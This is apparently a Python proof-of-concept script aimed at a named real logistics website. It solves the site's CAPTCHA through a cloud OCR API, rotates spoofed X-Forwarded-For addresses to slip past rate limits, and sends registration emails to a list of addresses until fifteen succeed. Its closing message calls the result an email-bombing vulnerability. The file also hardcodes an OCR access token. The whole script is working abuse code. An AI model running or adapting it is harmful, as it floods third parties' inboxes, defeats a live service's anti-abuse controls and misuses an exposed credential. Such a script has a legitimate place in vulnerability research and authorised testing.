import json
import time

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def do():
    target_url = "https://logistics.sheincorp.cn/"

    mail_list = []
    with open('../fuzz/mail.txt', 'r') as file:
        for line in file:
            # 去除行尾的换行符并添加到列表中
            mail_list.append(line.rstrip('\n'))

    ip_list = []
    with open('../fuzz/ip.txt', 'r') as file:
        for line in file:
            # 去除行尾的换行符并添加到列表中
            ip_list.append(line.rstrip('\n'))
    success_num = 0
    index = 0
    for ip in ip_list:
        headers = {
            "Host": "logistics.sheincorp.cn",
            "Connection": "close",
            "Content-Length": "139",
            "sec-ch-ua": '"Google Chrome";v="111", "Not(A:Brand";v="8", "Chromium";v="111"',
            "sec-ch-ua-platform": '"Windows"',
            "sec-ch-ua-mobile": "?0",
            "Authorization": "Bearer null",
            "routeName": "Register",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
            "Content-Type": "application/json;charset=UTF-8",
            "Accept": "*/*",
            "Origin": "https://logistics.sheincorp.cn",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://logistics.sheincorp.cn/",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "zh-CN,zh;q=0.9",
            "dnt": "1",
            "sec-gpc": "1",
            "X-Forwarded-For": ip,
        }

        body = '''
            {}
            '''

        # 获取验证码token和base64
        r = requests.get(url=target_url + "/api/v1/captcha/api?language=zh", timeout=5, verify=False)

        data = json.loads(r.text)
        # print(data)
        image_token = data['key']
        img = data['img']
        # print(image_token)
        # print(img)

        # 获取图片对应的值
        request_url = "https://aip.baidubce.com/rest/2.0/ocr/v1/general_basic"

        params = {"image": img}
        access_token = '[24.3e998f3ea69f02ca81139414d8f7aa02.2592000.1686383914.282335-33426254]'
        request_url = request_url + "?access_token=" + access_token
        ocr_headers = {'content-type': 'application/x-www-form-urlencoded'}
        response = requests.post(request_url, data=params, headers=ocr_headers)
        image_value = ""
        if response:
            data = response.json()
            try:
                image_value = data['words_result'][0]['words'].replace(" ", "")
                # print(image_value)
            except:
                continue
        if not image_value.encode().isalnum() or len(image_value) != 4:
            continue

        # 发送短信
        sms_body = '{"email": "' + mail_list[index] + '","name":"test1a2b3c","img_name": "' + image_token + '","img_captcha": "' + image_value + '"}'
        r = requests.post(url=target_url + "api/v1/register/email?language=zh", data=sms_body, headers=headers, timeout=20, verify=False)
        index = index + 1
        print(r.text)
        if '"code":0' in r.text:
            success_num = success_num + 1

        if success_num >= 15:
            print("测试成功发送15条信息，存在邮箱轰炸漏洞！")
            break


if __name__ == "__main__":
    do()
